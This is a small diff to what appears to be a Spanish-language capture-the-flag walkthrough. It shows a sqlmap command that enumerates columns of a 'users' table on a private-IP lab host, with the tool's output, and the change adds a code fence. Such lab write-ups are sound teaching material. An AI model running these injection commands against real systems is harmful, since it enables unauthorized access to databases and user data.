@@ -197,6 +197,7 @@ una sola tabla, ahora extraemos las columans de la tabla users:
 ```bash
 sqlmap -u http://192.168.1.45/auth-login.php --forms -D Nebuchadnezzar -T users --columns --batch
 ```
+```
 back-end DBMS: MySQL >= 5.0 (MariaDB fork)
 [10:47:34] [INFO] fetching columns for table 'users' in database 'Nebuchadnezzar'
 [10:47:34] [INFO] resumed: 'id'
